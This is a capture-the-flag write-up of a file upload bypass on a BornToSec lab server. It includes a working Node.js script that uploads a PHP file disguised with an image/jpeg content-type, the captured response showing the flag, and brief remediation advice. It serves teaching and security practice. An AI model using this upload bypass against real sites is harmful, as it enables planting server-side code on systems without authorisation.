# File upload bypass mock image content/type and sending script

Source: https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-content-type-and-magic-number

On the page `http://IP/?page=upload`, we can find a image upload form.
After trying uploading differents type of files, we assume that the server only accepts `jpg` format files.
We also know that the form uses multipart/formData.

## Bypassing the filename parser

We tried to trick the server verification by passing junk data in the filename such as:

- script.jpg.php
- file.png.jpg.php
...

The server continues rejecting are upload attempts.

## Mocking the file content-type

After submitting a request without selecting any file, by inspecting the browser.
You can copy the page's initiating request:

```js
fetch("http://IP/?page=upload", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryXayOWrhdk6J4aXb0",
    "upgrade-insecure-requests": "1",
    "cookie": "I_am_admin=68934a3e9455fa72420237eb05902327",
    "Referer": "http://IP/?page=upload",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0--\r\n",
  "method": "POST"
});
```

Request within you can find the default body:
```text
------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0--\r\n")
------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="uploaded"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryXayOWrhdk6J4aXb0--

```

Either from the form html structure than from the empty request body, you can find the formData entries.

- `uploaded` stores the file
- `MAX_FILE_SIZE` ( not safe either )
- `Upload` the submit button upload

The next step is to manually create the same formData with a custon `content-type` equal to `image/jpeg` but in reality would contain an evil script.

### The whole script
```js
try {
        const form = new formData()
        form.append('uploaded', await fs.readFile('./script.php'), {
            contentType: 'image/jpeg',
            filename: "script.php"
        });
        form.append('MAX_FILE_SIZE', 10_000);
        form.append('Upload', "Upload")

        const response = await fetch("http://192.168.56.101/?page=upload", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                ...form.getHeaders(),
                "upgrade-insecure-requests": "1",
                "cookie": "I_am_admin=68934a3e9455fa72420237eb05902327",
                "Referer": "http://192.168.56.101/?page=upload",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            "body": form,
            "method": "POST"
        });
        console.log(await response.text())
    } catch (e) {
        console.error(e)
    }
```

By running this Node.js script we're able to retrieve the flag in the rendered server's page.

```html
<!DOCTYPE HTML>
<html>
   <head>
      <title>BornToSec - Web Section</title>
      <meta http-equiv="content-type" content="text/html; charset=utf-8" />
      <meta name="description" content="" />
      <meta name="keywords" content="" />
      <!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
      <script src="js/jquery.min.js"></script>
      <script src="js/skel.min.js"></script>
      <script src="js/skel-layers.min.js"></script>
      <script src="js/init.js"></script>
      <noscript>
         <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/x-icon" href="favicon.ico" />
         <link rel="stylesheet" href="css/skel.css" />
         <link rel="stylesheet" href="css/style.css" />
         <link rel="stylesheet" href="css/style-xlarge.css" />
      </noscript>
   </head>
   <body class="landing">
      <!-- Header -->
      <header id="header" >
         <a href=http://192.168.56.101><img src=http://192.168.56.101/images/42.jpeg height=82px width=82px/></a>
         <nav id="nav">
            <ul>
               <li><a href="index.php">Home</a></li>
               <li><a href="?page=survey">Survey</a></li>
               <li><a href="?page=member">Members</a></li>
            </ul>
         </nav>
      </header>
      <!-- Main -->
      <section id="main" class="wrapper">
         <div class="container" style="margin-top:75px">
            <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre>
            <pre>/tmp/coco.php succesfully uploaded.</pre>
            <table width=50%>
               <tr style="background-color:transparent;border:none;">
                  <td colspan=2>
                     <h2 align=center>File upload:</h2>
                  </td>
               </tr>
               <tr style="background-color:transparent;border:none;">
                  <td align=center style="vertical-align:middle;">
                     <img src="images/upload.png" width=150px/>
                  </td>
                  <td>
                     <form enctype="multipart/form-data" action="#" method="POST">
                        <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
                        Choose an image to upload:
                        <br />
                        <input name="uploaded" type="file" /><br />
                        <br />
                        <input type="submit" name="Upload" value="Upload">
                     </form>
                  </td>
               </tr>
            </table>
         </div>
      </section>
      <!-- Footer -->
      <footer id="footer">
         <div class="container">
            <ul class="icons">
               <li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
               <li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
               <li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
            </ul>
            <ul class="copyright">
               <a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
                  <li>&copy; BornToSec</li>
               </a>
            </ul>
         </div>
      </footer>
   </body>
</html>
```

Solution:

The server should never trust the client income information, as they can be completly customed by anyone.
There's a lot of native solutions to securily verify the input file, such as [imagetype](https://www.php.net/manual/fr/function.exif-imagetype.php) or [finfo](https://www.php.net/manual/fr/function.finfo-file.php).
